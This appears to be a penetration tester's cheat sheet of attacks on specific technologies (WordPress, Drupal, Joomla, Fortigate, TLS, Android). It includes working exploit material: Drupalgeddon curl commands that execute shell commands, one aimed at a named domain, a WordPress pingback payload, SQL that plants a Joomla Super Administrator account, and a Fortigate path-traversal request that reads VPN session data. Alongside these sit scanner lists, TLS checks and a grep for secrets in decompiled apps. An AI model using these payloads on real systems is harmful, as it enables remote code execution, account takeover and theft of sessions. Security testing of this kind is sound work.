# Techno Specific

## CMS

### `Tools`

```text
Nikto
CMSmap
WhatCMS
Wpseku
WPScan
droopescan
joomscan
```

### Wordpress

Find version

* into xml via website.com/rss
* Html source code
* CMSmap or WPScan

XMLrpc

List methods

```bash
POST /xmlrpc.php HTTP/1.1
Host: <target>
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 95

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

if there is pingback, try :

```bash
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<ip_pingback>:<port></string></value>
</param><param><value><string>http://<ip_pingback>:<port>/toto</string>
</value></param></params>
</methodCall>
```

### Drupal

```bash
drupal , intruder from 0 to 500 on /node/$

/imce

Druppalgeddon 2/3
```

POC1 drupal 8

```bash
  curl -k -i 'https://filalapat.fr/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
    --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=uname -a'
```

POC2 drupal 8

```bash
curl -k -i 'https://filalapat.fr/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
    --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/2'
```

POC3 drupal 7

```bash
 curl -k -s 'http://localhost/drupal-7.55/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a' \
    --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id
```

### Joomla

Joomla 1.5

```bash
user:md5_gen(1)MD5$SALT
```

*  [https://www.exploit-db.com/exploits/6234](https://www.exploit-db.com/exploits/6234)
* [http://www.passwordtool.hu/joomla-password-hash-generator-salt-key](http://www.passwordtool.hu/joomla-password-hash-generator-salt-key)

```bash
creer new users INSERT INTO jos_users (name, username, password, usertype, gid, params) VALUES ('toto', 'toto', 'fcba92f4dd6b902f8a66054b8327ae6b:F2sVBzlFOUl51D3HtRZ0tionaJQGQqB', 'Super Administrator', 25, ''); INSERT INTO jos_core_acl_aro VALUES (NULL, 'users', LAST_INSERT_ID(), 0, 'toto', 0); INSERT INTO jos_core_acl_groups_aro_map VALUES (25, '', LAST_INSERT_ID());
```

## Reactjs

Security Testers: Inject JavaScript and JSON wherever you can and see what happens. Developers: Don’t ever `useeval()` or `dangerouslySetInnerHTML`. Avoid parsing user-supplied JSON.

## Angularjs

check the bypassSecurityTrustX / innerHTML function

```bash
bypassSecurityTrustHtml
bypassSecurityTrustScript
bypassSecurityTrustStyle
bypassSecurityTrustUrl
bypassSecurityTrustResourceUrl
```

## ckfinder

```bash
ckfinder/ckfinder.html
```

## Git

```bash
https://github.com/internetwache/GitTools/tree/master/Dumper
https://github.com/arthaud/git-dumper
run script post-merge https://docs.gitlab.com/ee/administration/custom_hooks.html  .git/hooks
```

## Stormshield

* TCP PORT 1300

[https://documentation.stormshield.eu/SNS/v3/fr/Content/CLI\_Serverd\_Commands\_reference\_Guide\_v3/Introduction.htm](https://documentation.stormshield.eu/SNS/v3/fr/Content/CLI_Serverd_Commands_reference_Guide_v3/Introduction.htm)

Check default password : \(UpdatePasswd=1 if factory password, 0 if the password already have been changed\) CHPWD 101 code=00a01000 msg="Begin" format="section" \[Result\] UpdatePasswd=0

## Fortigate

```bash
/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
```

## Dana

* [https://XXXX/dana-na/setup/psalinstall.cgi](https://XXXX/dana-na/setup/psalinstall.cgi)

## GPG decode

```bash
gpg --decrypt Test.zip.gpg > test.zip ( popup password )
```

## SSL / TLS

* [testssh.sh](https://github.com/drwetter/testssl.sh)

check Heartbleed

```bash
cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
```

Openssl

```bash
openssl s_client -cipher BEAST -connect <target>:443
openssl s_client -connect <target>:443 -ssl3

# Expiration date
openssl s_client -connect <target>:443 | openssl x509 -noout -dates
```

check lucky13

```bash
openssl s_client -cipher DES-CBC3-SHA -connect xx.fr:443
```

## SSH 

check if 4096 key

```bash
ssh-keygen -l -f key.pub
```

## `Android`

`Apktool`

```bash
apktool d app_name.apk
```

Extract sensitive info

```bash
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```



